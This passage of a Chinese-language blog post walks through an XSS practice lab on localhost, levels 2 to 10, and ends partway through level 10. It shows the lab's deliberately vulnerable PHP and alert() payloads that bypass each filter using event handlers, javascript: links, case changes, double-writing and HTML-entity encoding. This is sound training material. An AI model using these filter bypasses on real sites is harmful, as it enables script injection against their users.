&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level2.php?keyword=&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert()&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=JACK&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018205525037.png&#34; alt=&#34;image-20221018205525037&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看其后台源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;ini_set&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;display_errors&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;keyword&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;h2 align=center&amp;gt;没有找到和&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;htmlspecialchars&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;相关的结果.&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;center&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;form action=level2.php method=GET&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input name=keyword  value=&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input type=submit name=submit value=&amp;quot;搜索&amp;quot;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/center&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关键在于使用了 htmlspecialchars 函数做了转义。&lt;/p&gt;
&lt;p&gt;htmlspecialchars () 函数把预定义的字符转换为 HTML 实体。&lt;/p&gt;
&lt;p&gt;预定义的字符是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  （和号）成为  &lt;code&gt;&amp;amp;amp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;  （双引号）成为  &lt;code&gt;&amp;amp;quot&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  （单引号）成为  &lt;code&gt;&#39;&lt;/code&gt;   , 原样输出&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  （小于）成为  &lt;code&gt;&amp;amp;lt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;  （大于）成为  &lt;code&gt;&amp;amp;gt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xss事件绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss事件绕过&#34;&gt;#&lt;/a&gt; XSS 事件绕过&lt;/h2&gt;
&lt;p&gt;照前面的思路，这一题直接尝试在输入框写入 XSS 代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018210913300.png&#34; alt=&#34;image-20221018210913300&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看前台源码，看看过滤成了什么样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018210855840.png&#34; alt=&#34;image-20221018210855840&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们发现在 value 中的部分也做了过滤，那我们需要在逃逸单引号的同时，让 alert () 函数也执行。&lt;/p&gt;
&lt;p&gt;HTML 的事件函数，可以返回 script 值。也就是说，当你写入事件的参数时，事件触发后自动变成 script 标签：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018211546936.png&#34; alt=&#34;image-20221018211546936&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用 onclick 事件函数触发 alert ()&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level3.php?keyword=&amp;#x27; onclick=&amp;#x27;alert()&amp;#x27; &amp;#x27;&amp;amp;submit=æç´¢&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;提交 URL 后，随便点击一下触发 onclick 事件，成功绕过：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018212039821.png&#34; alt=&#34;image-20221018212039821&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss语法绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss语法绕过&#34;&gt;#&lt;/a&gt; XSS 语法绕过&lt;/h2&gt;
&lt;p&gt;第四关，我们直接看一下源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;ini_set&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;display_errors&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;keyword&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$str3&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$str2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;h2 align=center&amp;gt;没有找到和&amp;quot;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;htmlspecialchars&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;相关的结果.&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;center&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;form action=level4.php method=GET&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input name=keyword  value=&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$str3&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;input type=submit name=submit value=搜索 /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;/center&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现是使用 str_replace 来把 &lt;code&gt;&amp;gt;&lt;/code&gt;  和 &lt;code&gt;&amp;lt;&lt;/code&gt;  都替换成了空值，所以这种情况下，依旧使用 onclick 事件来 XSS 是可以的。&lt;/p&gt;
&lt;p&gt;观察前台源码是使用 &lt;code&gt;双引号&lt;/code&gt; 闭合的，那么输入：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;“ onclick=&amp;#x27;alert()&amp;#x27; ”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018212821722.png&#34; alt=&#34;image-20221018212821722&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss黑名单绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss黑名单绕过&#34;&gt;#&lt;/a&gt; XSS 黑名单绕过&lt;/h2&gt;
&lt;p&gt;第五关，我们照常理使用标准 XSS 脚本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看源代码看看变成了啥：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018213520325.png&#34; alt=&#34;image-20221018213520325&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;script&lt;/code&gt;  被替换成了 &lt;code&gt;scri_pt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那我们使用事件绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onclick=&amp;quot;alert()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018213639284.png&#34; alt=&#34;image-20221018213639284&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 &lt;code&gt;onclick&lt;/code&gt;  被替换成了 &lt;code&gt;o_nclick&lt;/code&gt; ，可见，逃逸 + 事件绕过宣告失败。&lt;/p&gt;
&lt;p&gt;竟然一些特殊的事件被 ban，逃逸 script 标签也不行，那么我们需要考虑一种别的标签，想到超链接标签（&lt;strong&gt;同样可以加入 js 代码&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;因此，尝试使用超链接如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level5.php?keyword=&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=æç´¢&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018213917443.png&#34; alt=&#34;image-20221018213917443&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss-href属性绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-href属性绕过&#34;&gt;#&lt;/a&gt; XSS Href 属性绕过&lt;/h2&gt;
&lt;p&gt;第六关，我们照往常一样，写入 XSS 代码：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert()&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现和上一题差不多&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018214339051.png&#34; alt=&#34;image-20221018214339051&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们直接使用超链接逃逸：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level6.php?keyword=&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=æç´¢&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018214448698.png&#34; alt=&#34;image-20221018214448698&#34;&gt;&lt;/p&gt;
&lt;p&gt;好小子，又过滤了 href 属性字段。&lt;/p&gt;
&lt;p&gt;但是我们思考一下，前几次看了源码后发现它都是写死在后台代码中。&lt;/p&gt;
&lt;p&gt;那么会不会这一次同样也是将 &lt;code&gt;script&lt;/code&gt; 、 &lt;code&gt;onclick&lt;/code&gt; 、 &lt;code&gt;href&lt;/code&gt;  硬编码在后台代码中做替换呢？&lt;/p&gt;
&lt;p&gt;由于 php 代码和 SQL 一样，不区大小写，我们尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;hRef&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/xss_vuln/level6.php?keyword=&amp;quot;&amp;gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;hRef&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:alert()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;a&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;amp;submit=æç´¢&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018214934374.png&#34; alt=&#34;image-20221018214934374&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss双写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss双写绕过&#34;&gt;#&lt;/a&gt; XSS 双写绕过&lt;/h2&gt;
&lt;p&gt;第 7 关，照往常，不过我们为了一次性观察想要的过滤信息，可以写成这样：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;&lt;/span&gt;javascript:&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;()&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;onclick script&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们发现， &lt;code&gt;href&lt;/code&gt; 、 &lt;code&gt;script&lt;/code&gt; 、 &lt;code&gt;on&lt;/code&gt;  这三个字符统统被吃掉&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018215624834.png&#34; alt=&#34;image-20221018215624834&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们有理由猜想，后台代码将其直接匹配之后直接替换成空。&lt;/p&gt;
&lt;p&gt;但往往简单的替换都是只匹配一次，我们可以尝试使用双写绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; oonnclick=&amp;quot;alert()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018215915039.png&#34; alt=&#34;image-20221018215915039&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss-html编码绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-html编码绕过&#34;&gt;#&lt;/a&gt; XSS HTML 编码绕过&lt;/h2&gt;
&lt;p&gt;第 8 关，输入 aaa 查看前台源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018221012248.png&#34; alt=&#34;image-20221018221012248&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们输入一句话探测：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert() onclick ononclick script&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么我们可以看到， &lt;code&gt;script&lt;/code&gt; 、 &lt;code&gt;onclick&lt;/code&gt; 、 &lt;code&gt;ononclick&lt;/code&gt; 、 &lt;code&gt;sCRipt&lt;/code&gt;  都被过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018221329565.png&#34; alt=&#34;image-20221018221329565&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们尝试使用更加细粒度的方法 ——&lt;strong&gt;HTML 编码绕过&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;格式： &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;字符C -----  &amp;amp;#67;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，67 是 C 的 ASCII 编码。&lt;/p&gt;
&lt;p&gt;我们使用字符 C 的 HTML 编码来绕过对 &lt;code&gt;script&lt;/code&gt;  中字符 C 的检查：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javas&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#67;&lt;/span&gt;ript:alert()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018221658617.png&#34; alt=&#34;image-20221018221658617&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss-特殊场景逻辑绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-特殊场景逻辑绕过&#34;&gt;#&lt;/a&gt; XSS 特殊场景逻辑绕过&lt;/h2&gt;
&lt;p&gt;第 9 关，我们照常理 &lt;code&gt;aaa&lt;/code&gt;  输入看源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018222234951.png&#34; alt=&#34;image-20221018222234951&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入的 &lt;code&gt;aaa&lt;/code&gt;  被替换成了一段文字，链接不合法，那我们输入 &lt;code&gt;http://www.baidu.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018222425416.png&#34; alt=&#34;image-20221018222425416&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功控制 href 属性值，那么我们可以尝试一句话探测：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert();onclick oonnclick http://www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，我们的 &lt;code&gt;script&lt;/code&gt; 、 &lt;code&gt;onclick&lt;/code&gt; 、 &lt;code&gt;oonnclick&lt;/code&gt;  均被过滤&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018222603234.png&#34; alt=&#34;image-20221018222603234&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试&lt;strong&gt; HTML 编码&lt;/strong&gt;，并使用 &lt;code&gt;//&lt;/code&gt;  注释掉后面的正常链接。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javas&lt;span class=&#34;symbol&#34;&gt;&amp;amp;#67;&lt;/span&gt;ript:alert();//http://www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018222900374.png&#34; alt=&#34;image-20221018222900374&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;xss隐藏字段绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss隐藏字段绕过&#34;&gt;#&lt;/a&gt; XSS 隐藏字段绕过&lt;/h2&gt;
&lt;p&gt;第 10 关，乍一看，完全没有输入框做交互&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018230848936.png&#34; alt=&#34;image-20221018230848936&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接查看前台源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018230921199.png&#34; alt=&#34;image-20221018230921199&#34;&gt;&lt;/p&gt;
&lt;p&gt;这三个 &lt;code&gt;input&lt;/code&gt;  框，其 type 属性全都是 &lt;code&gt;hidden&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;那么，我们全都请求一遍，看看哪个能被我们控制？&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;view-source:http://127.0.0.1/xss_vuln/level10.php?t_link=t_link&amp;amp;t_history=t_history&amp;amp;t_sort=t_sort&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221018231130250.png&#34; alt=&#34;image-20221018231130250&#34;&gt;&lt;/p&gt;
